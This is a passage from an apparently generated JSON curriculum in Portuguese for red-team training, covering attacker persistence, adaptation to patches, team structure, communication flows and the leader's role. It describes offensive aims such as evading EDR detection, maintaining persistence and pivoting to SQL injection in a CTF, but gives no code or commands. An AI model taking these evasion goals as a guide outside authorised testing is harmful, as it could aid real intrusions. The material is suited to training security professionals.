                                "Logs mostram análises detalhadas de cada falha e ajuste.",
                                "Autoavaliação de paciência ≥8/10 com evidências emocionais controladas.",
                                "Relatório de reflexão liga prática a conceitos de MURDOCH (2017).",
                                "Plano para 3 práticas futuras definido.",
                                "Tempo total dentro de 2.5 horas sem quebras longas."
                              ],
                              "assessmentCriteria": [
                                "Profundidade das iterações: Mínimo 4 com ajustes progressivos (peso 30%).",
                                "Controle emocional: Evidência de pausas e journaling (peso 25%).",
                                "Análise de falhas: Identificação precisa de detecções simuladas (peso 20%).",
                                "Reflexão qualitativa: Insights acionáveis e conexões teóricas (peso 15%).",
                                "Documentação completa: Logs, relatórios e verificações (peso 10%)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Técnicas de resiliência mental de terapia cognitivo-comportamental.",
                                "Programação: Debugging iterativo em código com falhas recorrentes.",
                                "Estratégia Militar: Doutrina de persistência em operações OODA loop.",
                                "Gestão de Projetos: Iterações ágeis em Scrum para superar bloqueios."
                              ],
                              "realWorldApplication": "Em pentests profissionais ou Red Team ops, persistir em pivots após detecções iniciais (ex: EDR alerts), ajustando TTPs como em campanhas APT reais, evitando detecção total e maximizando impacto."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.3.3",
                            "name": "Adotar Adaptabilidade a Mudanças",
                            "description": "Ajustar táticas em tempo real com base em feedback ambiental, promovendo um mindset resiliente contra patches e atualizações de segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Adaptabilidade",
                                  "subSteps": [
                                    "Defina adaptabilidade como ajuste tático baseado em feedback ambiental em cenários cibernéticos.",
                                    "Estude exemplos históricos, como o patch do EternalBlue que forçou adaptações em campanhas de ransomware.",
                                    "Identifique triggers comuns: patches de software, atualizações de firewall e mudanças em detecção de IDS.",
                                    "Explore o mindset resiliente: aceite incerteza e veja mudanças como oportunidades.",
                                    "Mapeie componentes psicológicos: controle emocional e foco em soluções."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras explicando adaptabilidade com 3 exemplos reais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre EternalBlue (MS17-010)",
                                    "Vídeo TED sobre resiliência mental",
                                    "Lista de CVEs recentes"
                                  ],
                                  "tips": [
                                    "Use analogias de esportes para visualizar: como um jogador ajusta estratégia no meio do jogo.",
                                    "Registre insights em um journal para reforço."
                                  ],
                                  "learningObjective": "Dominar a definição e importância da adaptabilidade em cibersegurança.",
                                  "commonMistakes": [
                                    "Confundir adaptabilidade com improviso aleatório.",
                                    "Subestimar o impacto psicológico de falhas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar Feedback Ambiental em Tempo Real",
                                  "subSteps": [
                                    "Configure ferramentas de monitoramento: logs de rede, alertas de IDS e scans contínuos.",
                                    "Pratique detecção de mudanças: simule patches em VMs e observe impactos.",
                                    "Desenvolva checklists para feedback: 'O que mudou? Por quê? Qual o impacto imediato?'",
                                    "Treine observação ativa: pause operações a cada 5 minutos para scan ambiental.",
                                    "Integre automação básica: scripts para alertas de atualizações de software."
                                  ],
                                  "verification": "Demonstre monitoramento capturando uma mudança simulada em uma VM e registrando em log.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "VMware/VirtualBox com Kali Linux",
                                    "Ferramentas: Wireshark, Nmap, Snort",
                                    "Script Python para monitoramento"
                                  ],
                                  "tips": [
                                    "Defina thresholds de alerta para evitar sobrecarga sensorial.",
                                    "Pratique em sessões curtas para construir hábito."
                                  ],
                                  "learningObjective": "Habilitar detecção proativa de mudanças ambientais.",
                                  "commonMistakes": [
                                    "Ignorar sinais sutis como lentidão na rede.",
                                    "Dependência excessiva de ferramentas sem validação manual."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Impacto das Mudanças e Planejar Ajustes",
                                  "subSteps": [
                                    "Avalie o impacto: classifique como crítico, moderado ou irrelevante usando matriz de risco.",
                                    "Brainstorm alternativas: liste 3-5 táticas pivotantes baseadas no feedback.",
                                    "Priorize ajustes: foque em opções de baixo risco e alto impacto.",
                                    "Simule cenários: use decision trees para prever outcomes de cada ajuste.",
                                    "Documente raciocínio: crie um 'adjustment log' com before/after."
                                  ],
                                  "verification": "Crie uma matriz de risco para uma mudança simulada e selecione o melhor ajuste.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Planilha Excel/Google Sheets para matriz de risco",
                                    "Ferramentas de mind mapping como Draw.io",
                                    "Casos de estudo de wargames cibernéticos"
                                  ],
                                  "tips": [
                                    "Limite brainstorm a 10 minutos para manter agilidade.",
                                    "Pergunte: 'E se isso falhar?' para robustez."
                                  ],
                                  "learningObjective": "Desenvolver análise rápida e planejamento adaptativo.",
                                  "commonMistakes": [
                                    "Paralisia por análise excessiva.",
                                    "Escolha de ajustes sem considerar recursos disponíveis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Ajustes e Cultivar Resiliência",
                                  "subSteps": [
                                    "Implemente o plano ajustado: execute em ambiente controlado primeiro.",
                                    "Monitore resultados em loop: ajuste iterativamente com base em novo feedback.",
                                    "Reflita pós-execução: o que funcionou? O que melhorar no mindset?",
                                    "Pratique cenários de estresse: simule múltiplas mudanças simultâneas.",
                                    "Construa hábitos resilientes: meditação de 5 min diária focada em aceitação de falhas."
                                  ],
                                  "verification": "Execute um ajuste completo em simulação e reflita em relatório de 1 página.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ambiente de lab: TryHackMe ou HackTheBox",
                                    "Timer para simulações cronometradas",
                                    "App de meditação como Headspace"
                                  ],
                                  "tips": [
                                    "Respire fundo antes de pivotar para manter calma.",
                                    "Celebre pequenos sucessos para reforçar mindset."
                                  ],
                                  "learningObjective": "Aplicar ajustes em tempo real e fortalecer resiliência comportamental.",
                                  "commonMistakes": [
                                    "Persistir em táticas falhas por apego emocional.",
                                    "Pular reflexão pós-ação."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um CTF de wargame cibernético, sua exploit de buffer overflow falha devido a um patch surpresa no target. Monitore logs, detecte o patch, analise impacto (exploit bloqueado), pivote para uma injeção SQL via configuração exposta, execute e ganhe acesso mantendo stealth.",
                              "finalVerifications": [
                                "Identifica mudanças ambientais em menos de 2 minutos durante simulação.",
                                "Gera 3+ alternativas viáveis para qualquer trigger comum.",
                                "Mantém performance estável sob estresse de múltiplas mudanças.",
                                "Documenta ajustes com logs claros e acionáveis.",
                                "Demonstra mindset resiliente em debriefing verbal.",
                                "Adapta com sucesso em 80%+ de cenários de wargame."
                              ],
                              "assessmentCriteria": [
                                "Velocidade de detecção e análise (média <5 min por mudança).",
                                "Qualidade das alternativas geradas (diversidade e viabilidade).",
                                "Taxa de sucesso na execução de pivôs (≥75%).",
                                "Profundidade da reflexão e aprendizado iterativo.",
                                "Controle emocional medido por auto-relato e observação.",
                                "Integração de feedback em loops contínuos."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Resiliência e growth mindset (Carol Dweck).",
                                "Estratégia Militar: OODA Loop (Observe, Orient, Decide, Act).",
                                "Programação: Debugging iterativo e refactoring de código.",
                                "Gestão de Projetos: Agile methodologies e sprints adaptativos.",
                                "Jogos: Estratégias em MOBAs ou xadrez para pivôs táticos."
                              ],
                              "realWorldApplication": "Em red teaming profissional, defesas atualizam dinamicamente (ex: patch zero-day); adaptabilidade permite manter persistência, evadir detecção e completar missões como em operações da NSA ou firmas como Mandiant."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.2",
                    "name": "Organização do Red Team",
                    "description": "Estrutura, papéis e funções da equipe de simulação de ataques.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.2.1",
                        "name": "Estrutura Organizacional do Red Team",
                        "description": "A estrutura organizacional do Red Team é projetada para simular ataques cibernéticos de forma coordenada, incluindo níveis de liderança, operadores de campo e suporte técnico, garantindo eficiência e conformidade com regras de engajamento.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.1",
                            "name": "Identificar componentes da estrutura hierárquica",
                            "description": "Reconhecer os principais componentes da estrutura do Red Team, como liderança estratégica, equipe operacional e suporte logístico, com base em guias práticos como o de Vest e Tuberville.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Estrutura Hierárquica em Red Teams",
                                  "subSteps": [
                                    "Defina o que é uma estrutura hierárquica em contextos de operações cibernéticas.",
                                    "Pesquise definições gerais de Red Team em fontes confiáveis como MITRE ATT&CK ou NIST.",
                                    "Identifique a importância da hierarquia para coordenação eficaz em simulações de ataque.",
                                    "Compare estruturas hierárquicas em equipes militares tradicionais com Red Teams modernos."
                                  ],
                                  "verification": "Crie um resumo de 100 palavras explicando o conceito e sua relevância.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook ou app de notas (ex: Notion, Evernote)"
                                  ],
                                  "tips": "Comece com fontes oficiais para evitar desinformação.",
                                  "learningObjective": "Entender o papel da hierarquia na eficiência operacional do Red Team.",
                                  "commonMistakes": "Confundir hierarquia com estruturas planas usadas em equipes ágeis."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar os Principais Componentes da Estrutura",
                                  "subSteps": [
                                    "Liste os três componentes principais: liderança estratégica, equipe operacional e suporte logístico.",
                                    "Descreva responsabilidades da liderança estratégica (definição de objetivos, planejamento).",
                                    "Detalhe funções da equipe operacional (execução de ataques simulados, coleta de dados).",
                                    "Explique o suporte logístico (ferramentas, relatórios, conformidade legal)."
                                  ],
                                  "verification": "Desenhe um diagrama simples com os três componentes e suas funções principais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagramação (ex: Draw.io)",
                                    "Documentos iniciais sobre Red Teams"
                                  ],
                                  "tips": "Use bullet points para clareza antes de diagramar.",
                                  "learningObjective": "Reconhecer e diferenciar os componentes chave da estrutura hierárquica.",
                                  "commonMistakes": "Subestimar o suporte logístico como 'secundário' quando é essencial para sustentabilidade."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Guias Práticos de Vest e Tuberville",
                                  "subSteps": [
                                    "Localize e leia trechos dos guias de Vest e Tuberville sobre estruturas de Red Team.",
                                    "Mapeie como os guias descrevem liderança, operacional e logístico.",
                                    "Identifique exemplos ou diagramas nos guias e anote variações.",
                                    "Compare com estruturas padrão para notar adaptações cibernéticas."
                                  ],
                                  "verification": "Escreva um parágrafo comparando os guias com conhecimentos prévios.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Guias de Vest e Tuberville (PDFs ou online)",
                                    "Realçador digital para anotações"
                                  ],
                                  "tips": "Foque em seções sobre organização; ignore detalhes táticos por enquanto.",
                                  "learningObjective": "Aplicar conhecimentos de guias práticos para validar componentes hierárquicos.",
                                  "commonMistakes": "Ignorar contextos específicos dos guias, como escala da operação."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Visualizar a Estrutura Completa",
                                  "subSteps": [
                                    "Integre informações de todos os passos em um organograma hierárquico.",
                                    "Adicione setas mostrando fluxos de comunicação e dependências.",
                                    "Teste a compreensão respondendo perguntas sobre interações entre componentes.",
                                    "Refine o diagrama com base em feedback autoavaliado."
                                  ],
                                  "verification": "Apresente o organograma e explique verbalmente ou por escrito o fluxo hierárquico.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação avançada (ex: Lucidchart)",
                                    "Organograma preliminar do step 2"
                                  ],
                                  "tips": "Use cores para diferenciar componentes (ex: azul para liderança).",
                                  "learningObjective": "Criar uma representação visual acionável da estrutura hierárquica.",
                                  "commonMistakes": "Criar diagramas lineares em vez de hierárquicos verdadeiros."
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team para uma empresa bancária, a liderança estratégica define o alvo (sistema de transferências); a equipe operacional executa phishing e exploração; o suporte logístico fornece VMs isoladas, ferramentas como Metasploit e gera relatórios de conformidade.",
                              "finalVerifications": [
                                "Pode listar e descrever os três componentes principais sem hesitação.",
                                "Consegue mapear responsabilidades específicas de cada componente.",
                                "Identifica pelo menos duas interdependências entre componentes.",
                                "Explica adaptações dos guias de Vest e Tuberville para cenários cibernéticos.",
                                "Valida a estrutura com um diagrama coerente e legível."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação dos componentes (90%+ correção).",
                                "Profundidade nas descrições de responsabilidades (detalhes de guias incluídos).",
                                "Qualidade visual e lógica do diagrama hierárquico.",
                                "Compreensão de fluxos e dependências entre níveis.",
                                "Aplicação correta de conceitos dos guias práticos."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos (PMBOK: estruturas matriciais).",
                                "Liderança e Organização Empresarial (hierarquias corporativas).",
                                "Logística e Cadeia de Suprimentos (suporte operacional).",
                                "Teoria Militar (comandos e controles em operações).",
                                "Análise Organizacional (teoria das organizações)."
                              ],
                              "realWorldApplication": "Em uma operação de pentest real, compreender a estrutura hierárquica permite ao profissional atribuir papéis corretos, evitando falhas como falta de suporte logístico que compromete a legalidade ou eficácia da simulação de ataque."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.2",
                            "name": "Mapear fluxos de comunicação interna",
                            "description": "Descrever os canais de comunicação e relatórios dentro da estrutura do Red Team, incluindo ferramentas colaborativas para coordenação durante operações de simulação de ataques.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar a Estrutura Organizacional do Red Team",
                                  "subSteps": [
                                    "Identifique os papéis principais no Red Team (ex: líder, analistas de ataque, engenheiros de exploit).",
                                    "Desenhe um organograma básico mostrando hierarquia e relações de reporte.",
                                    "Liste responsabilidades de comunicação para cada papel.",
                                    "Documente reuniões regulares e cadências de comunicação.",
                                    "Colete inputs de membros da equipe sobre fluxos atuais."
                                  ],
                                  "verification": "Organograma completo com pelo menos 5 papéis e suas responsabilidades de comunicação documentadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de diagramação como Draw.io ou Lucidchart; atas de reuniões passadas; lista de membros do time.",
                                  "tips": "Comece pelo topo da hierarquia para garantir alinhamento com liderança.",
                                  "learningObjective": "Compreender como a estrutura organizacional influencia os fluxos de comunicação.",
                                  "commonMistakes": "Ignorar papéis periféricos como suporte logístico que impactam coordenação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Canais e Ferramentas de Comunicação",
                                  "subSteps": [
                                    "Liste canais síncronos (ex: Slack, Microsoft Teams, Discord) e assíncronos (ex: email, Jira).",
                                    "Registre ferramentas colaborativas usadas em operações (ex: Mattermost para ops seguras, Trello para tasks).",
                                    "Avalie frequência e propósitos de cada canal (ex: Slack para updates rápidos).",
                                    "Verifique integrações entre ferramentas (ex: bots de notificação).",
                                    "Documente políticas de uso e níveis de segurança para cada canal."
                                  ],
                                  "verification": "Tabela completa com canais, ferramentas, propósitos, frequência e segurança.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Acesso a plataformas de comunicação; planilha Google Sheets ou Excel.",
                                  "tips": "Priorize canais usados em simulações de ataques para relevância operacional.",
                                  "learningObjective": "Catalogar ferramentas que suportam coordenação segura e eficiente.",
                                  "commonMistakes": "Subestimar riscos de segurança em canais não criptografados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Fluxos de Comunicação e Relatórios",
                                  "subSteps": [
                                    "Desenhe fluxos de comunicação diária (ex: líder -> analistas via Slack).",
                                    "Mapeie fluxos de relatórios (ex: relatórios de progresso semanais via Jira).",
                                    "Inclua fluxos durante operações (ex: canal dedicado para coordenação em tempo real).",
                                    "Identifique gargalos ou sobreposições nos fluxos.",
                                    "Crie diagrama visual com setas indicando direção e tipo de info."
                                  ],
                                  "verification": "Diagrama de fluxo com pelo menos 10 conexões mapeadas e legendas claras.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Software de modelagem como Microsoft Visio ou Miro; exemplos de fluxos de outros times.",
                                  "tips": "Use cores para diferenciar tipos de comunicação (ex: azul para relatórios, vermelho para alertas).",
                                  "learningObjective": "Visualizar como informações fluem para suportar decisões em simulações.",
                                  "commonMistakes": "Criar mapa muito genérico sem detalhes operacionais específicos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Ferramentas Colaborativas e Validar o Mapa",
                                  "subSteps": [
                                    "Configure ou simule integrações (ex: Slack + Jira para automação de reports).",
                                    "Compartilhe o mapa draft com o time via ferramenta colaborativa para feedback.",
                                    "Incorpore sugestões e refine fluxos baseados em cenários de simulação de ataques.",
                                    "Teste o mapa em uma simulação curta para validar efetividade.",
                                    "Finalize documentação com versão controlada."
                                  ],
                                  "verification": "Mapa validado com feedback de pelo menos 3 membros e teste simulado documentado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Plataformas colaborativas como Google Workspace ou Notion; acesso de teste a ferramentas.",
                                  "tips": "Agende uma sessão rápida de feedback para agilizar iterações.",
                                  "learningObjective": "Garantir que o mapa seja prático e adaptável a operações reais.",
                                  "commonMistakes": "Não testar em contexto operacional, levando a fluxos teóricos inviáveis."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e Manter o Mapa de Fluxos",
                                  "subSteps": [
                                    "Compile todos os elementos em um documento centralizado.",
                                    "Defina processo de revisão periódica (ex: trimestral).",
                                    "Treine o time no uso do mapa durante onboarding.",
                                    "Integre ao playbook de operações do Red Team.",
                                    "Monitore uso e atualize com lições aprendidas."
                                  ],
                                  "verification": "Documento final compartilhado e playbook atualizado com referências ao mapa.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Ferramenta de versionamento como Git ou Confluence; template de playbook.",
                                  "tips": "Use hyperlinks no documento para navegação rápida entre seções.",
                                  "learningObjective": "Estabelecer o mapa como recurso vivo para coordenação contínua.",
                                  "commonMistakes": "Deixar o mapa estático sem plano de manutenção."
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma rede corporativa, o líder do Red Team usa Slack para coordenar analistas em tempo real ('#op-phishing-updates'), Jira para rastrear exploits desenvolvidos, e um canal criptografado no Signal para relatórios sensíveis ao comando. O mapa visualiza: Líder -> Slack -> Analistas (diário); Analistas -> Jira -> Líder (semanal); Todos -> Signal -> Comando (crítico).",
                              "finalVerifications": [
                                "Mapa cobre todos os papéis e canais identificados.",
                                "Fluxos são testados em pelo menos um cenário simulado.",
                                "Feedback de equipe incorporado com registro de mudanças.",
                                "Diagrama é legível e inclui legendas para tipos de comunicação.",
                                "Políticas de segurança explicitadas para cada canal.",
                                "Processo de manutenção definido e documentado."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos os canais e fluxos principais mapeados (30%).",
                                "Clareza: Diagramas visuais intuitivos e bem legendados (25%).",
                                "Relevância: Foco em coordenação durante operações de simulação (20%).",
                                "Praticidade: Integrações testadas e feedback validado (15%).",
                                "Segurança: Riscos identificados e mitigados (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Uso de fluxos ágeis como em Scrum.",
                                "Liderança e Trabalho em Equipe: Melhoria de coordenação hierárquica.",
                                "Tecnologias da Informação: Integração de ferramentas colaborativas seguras.",
                                "Análise de Sistemas: Modelagem de fluxos como em engenharia de software."
                              ],
                              "realWorldApplication": "Durante operações reais de Red Team em exercícios de defesa cibernética, o mapa garante comunicação rápida e segura, reduzindo erros de coordenação, acelerando respostas a incidentes simulados e facilitando relatórios precisos para stakeholders, similar a equipes de resposta a incidentes (IRT) em empresas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.3",
                            "name": "Analisar escalabilidade da estrutura",
                            "description": "Avaliar como a estrutura do Red Team pode ser adaptada para diferentes tamanhos de operações, considerando crescimento de equipe e integração com Blue Team em jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Mapear a Estrutura Atual do Red Team",
                                  "subSteps": [
                                    "Documente os papéis atuais (ex: líder, analistas de ameaças, engenheiros de exploit).",
                                    "Identifique o número atual de membros e hierarquia organizacional.",
                                    "Registre fluxos de comunicação e ferramentas usadas.",
                                    "Avalie responsabilidades principais e dependências internas.",
                                    "Crie um diagrama visual da estrutura (organograma)."
                                  ],
                                  "verification": "Diagrama completo da estrutura atual aprovado por um revisor.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), documentação do Red Team.",
                                  "tips": "Use cores para diferenciar papéis e setas para fluxos de trabalho.",
                                  "learningObjective": "Compreender a composição baseline da equipe para baseline de escalabilidade.",
                                  "commonMistakes": "Ignorar papéis informais ou fluxos de comunicação não documentados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Fatores de Escalabilidade",
                                  "subSteps": [
                                    "Liste variáveis chave: tamanho da operação (pequena/média/grande), crescimento projetado da equipe.",
                                    "Analise gargalos potenciais (ex: liderança centralizada, ferramentas limitadas).",
                                    "Considere integrações com Blue Team: pontos de handover, compartilhamento de inteligência.",
                                    "Defina métricas de escalabilidade (ex: tempo de resposta, taxa de sucesso em simulações).",
                                    "Priorize fatores por impacto (alta/média/baixa)."
                                  ],
                                  "verification": "Lista priorizada de fatores com métricas definidas e justificada.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Planilhas (Excel/Google Sheets), frameworks de análise SWOT.",
                                  "tips": "Use matrizes para priorizar: impacto vs. facilidade de adaptação.",
                                  "learningObjective": "Reconhecer elementos que afetam a expansão sustentável da estrutura.",
                                  "commonMistakes": "Subestimar custos de integração com Blue Team ou sobrecarga de liderança."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modelar Cenários de Adaptação",
                                  "subSteps": [
                                    "Crie 3 cenários: equipe pequena (5-10), média (11-30), grande (>30 membros).",
                                    "Adapte a estrutura para cada: adicione sub-equipes, delegue autoridade.",
                                    "Inclua planos de integração Blue Team: canais dedicados, protocolos de rules of engagement.",
                                    "Simule fluxos com diagramas atualizados para cada cenário.",
                                    "Estime recursos adicionais necessários (pessoal, ferramentas)."
                                  ],
                                  "verification": "Diagramas e planos para todos os cenários completos e comparados.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas de modelagem (Visio, Miro), calculadoras de custo.",
                                  "tips": "Teste cenários com role-playing rápido para validar fluxos.",
                                  "learningObjective": "Desenvolver modelos adaptáveis para diferentes escalas operacionais.",
                                  "commonMistakes": "Não considerar latência em comunicações em equipes grandes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Riscos e Recomendações Finais",
                                  "subSteps": [
                                    "Identifique riscos em cada cenário (ex: perda de agilidade em equipes grandes).",
                                    "Proponha mitigações: treinamentos híbridos, automação de tarefas.",
                                    "Avalie integração Blue Team: simulações conjuntas para testar handovers.",
                                    "Compile relatório com recomendações acionáveis e roadmap de implementação.",
                                    "Valide com stakeholders simulados."
                                  ],
                                  "verification": "Relatório final com riscos mitigados e roadmap aprovado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Templates de relatório, ferramentas de risco (Risk Matrix).",
                                  "tips": "Quantifique riscos com probabilidades e impactos numéricos.",
                                  "learningObjective": "Garantir que adaptações sejam resilientes e otimizadas.",
                                  "commonMistakes": "Focar apenas em crescimento sem considerar downsizing ou contração."
                                }
                              ],
                              "practicalExample": "Em um exercício cibernético nacional, uma equipe Red Team de 8 membros escala para 25 ao adicionar alvos complexos. A análise adapta a estrutura adicionando dois leads de sub-equipes (exploits e inteligência), com canais Slack dedicados para Blue Team handovers, mantendo tempo de ciclo de ataque abaixo de 48h.",
                              "finalVerifications": [
                                "Estrutura mapeada e diagramada para baseline atual.",
                                "Fatores de escalabilidade priorizados com métricas claras.",
                                "Cenários modelados para 3 tamanhos de operação com adaptações detalhadas.",
                                "Riscos identificados e mitigados em relatório final.",
                                "Integração Blue Team validada com protocolos definidos.",
                                "Roadmap de implementação viável e cronometrado."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na identificação de gargalos (nota 1-5).",
                                "Qualidade e realismo dos modelos de cenários (visual e lógico).",
                                "Abrangência da análise de integração Blue Team.",
                                "Quantificação de riscos e mitigações eficazes.",
                                "Clareza e acionabilidade do relatório final.",
                                "Alinhamento com métricas de performance cibernética."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Uso de metodologias ágeis para escalabilidade.",
                                "Liderança e Organização: Teorias de estrutura organizacional (ex: Mintzberg).",
                                "Análise de Sistemas: Modelagem de sistemas complexos e gargalos.",
                                "Estratégia Empresarial: Planejamento de crescimento sustentável."
                              ],
                              "realWorldApplication": "Em empresas como Google ou bancos, Red Teams escalam para auditar infraestruturas globais, adaptando estruturas para integrar com equipes de defesa (Blue), garantindo conformidade regulatória e resposta rápida a ameaças emergentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.2",
                        "name": "Papéis Principais no Red Team",
                        "description": "Os papéis principais incluem Red Team Leader, Operator, Social Engineer e Analyst, cada um com responsabilidades específicas para emular táticas de adversários reais em cenários de teste.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.2.1",
                            "name": "Descrever o papel do Red Team Leader",
                            "description": "Explicar as funções do líder do Red Team, como planejamento estratégico, aprovação de regras de engajamento e supervisão geral das operações de simulação de ataques cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Contexto Geral do Red Team em Cibersegurança",
                                  "subSteps": [
                                    "Pesquise definições de Red Team e sua diferença para Blue Team e Purple Team.",
                                    "Identifique o propósito principal: simular ataques cibernéticos realistas para testar defesas.",
                                    "Analise exemplos históricos de operações de Red Team em cenários corporativos ou governamentais.",
                                    "Registre anotações sobre o papel do líder como figura central na coordenação.",
                                    "Compare com equipes de penetração ética (pentest) para destacar semelhanças e diferenças."
                                  ],
                                  "verification": "Crie um mapa mental ou resumo de 1 página explicando o contexto do Red Team e mencionando o líder.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigos da NIST sobre Red Team, vídeos do YouTube sobre cibersegurança ofensiva, ferramenta de mind mapping como MindMeister.",
                                  "tips": "Use fontes confiáveis como OWASP ou MITRE ATT&CK para evitar informações desatualizadas.",
                                  "learningObjective": "Ao final deste passo, você será capaz de explicar o contexto do Red Team e posicionar o papel do líder dentro dele.",
                                  "commonMistakes": "Confundir Red Team com hacking malicioso; lembre-se que é simulação ética e autorizada."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar as Responsabilidades Principais do Red Team Leader",
                                  "subSteps": [
                                    "Liste funções gerais: planejamento, coordenação de equipe, relatórios finais.",
                                    "Destaque liderança estratégica versus tática dos membros da equipe.",
                                    "Pesquise frameworks como MITRE para responsabilidades específicas de líderes.",
                                    "Crie uma tabela com colunas: Responsabilidade, Descrição, Importância.",
                                    "Priorize funções como aprovação de escopo e gerenciamento de riscos."
                                  ],
                                  "verification": "Produza uma lista numerada de pelo menos 8 responsabilidades principais com breves descrições.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação MITRE ATT&CK, frameworks de Red Team como o da SANS Institute, planilha Google Sheets.",
                                  "tips": "Foquem em responsabilidades únicas do líder, não tarefas operacionais dos analistas.",
                                  "learningObjective": "Ao final, você conseguirá enumerar e justificar as principais responsabilidades do Red Team Leader.",
                                  "commonMistakes": "Subestimar o aspecto gerencial; o líder não executa ataques, mas os orquestra."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar o Planejamento Estratégico do Red Team Leader",
                                  "subSteps": [
                                    "Descreva fases do planejamento: definição de objetivos, escopo, cronograma.",
                                    "Explique alinhamento com metas organizacionais e stakeholders.",
                                    "Inclua análise de ameaças e seleção de táticas (baseado em frameworks como Cyber Kill Chain).",
                                    "Crie um fluxograma simples do processo de planejamento.",
                                    "Considere restrições legais e éticas no planejamento."
                                  ],
                                  "verification": "Desenhe ou descreva um plano estratégico fictício para uma operação de Red Team em 200 palavras.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramentas de fluxograma como Lucidchart ou Draw.io, guia Cyber Kill Chain da Lockheed Martin.",
                                  "tips": "Sempre inclua métricas de sucesso no planejamento para mensurar impacto.",
                                  "learningObjective": "Você aprenderá a delinear o processo de planejamento estratégico liderado pelo Red Team Leader.",
                                  "commonMistakes": "Ignorar alinhamento com defesa (Blue Team); planejamento deve ser colaborativo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explicar a Aprovação de Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Defina ROE: limites operacionais, ativos fora de escopo, métodos permitidos.",
                                    "Descreva o processo de aprovação pelo líder: revisão, assinatura, comunicação à equipe.",
                                    "Exemplifique ROE para cenários como phishing simulado ou exploração de vulnerabilidades.",
                                    "Discuta atualizações dinâmicas de ROE durante operações.",
                                    "Enfatize conformidade legal (ex: GDPR, leis locais de cibersegurança)."
                                  ],
                                  "verification": "Escreva um exemplo de documento ROE com 5 regras específicas e justifique aprovação pelo líder.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Templates de ROE de fontes como CREST ou exemplos públicos de pentest.",
